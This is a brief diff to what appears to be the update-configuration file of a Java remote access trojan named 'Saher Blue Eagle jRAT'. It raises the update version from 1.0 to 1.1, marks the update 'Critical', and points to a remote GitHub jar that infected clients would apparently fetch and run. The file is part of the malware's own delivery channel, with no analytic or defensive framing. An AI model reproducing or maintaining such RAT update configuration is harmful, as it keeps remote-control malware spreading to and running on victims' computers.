@@ -7,7 +7,7 @@
 set Values = "_
 jsz=2
 jname=Saher Blue Eagle jRAT
-jupdate=1.0
+jupdate=1.1
 jversion=1.0
 joptions=https://github.com/SaherBlueEagle/BlueEagle_jRAT/raw/master/Release/testupdate.jar
 jupdatestatus=Critical
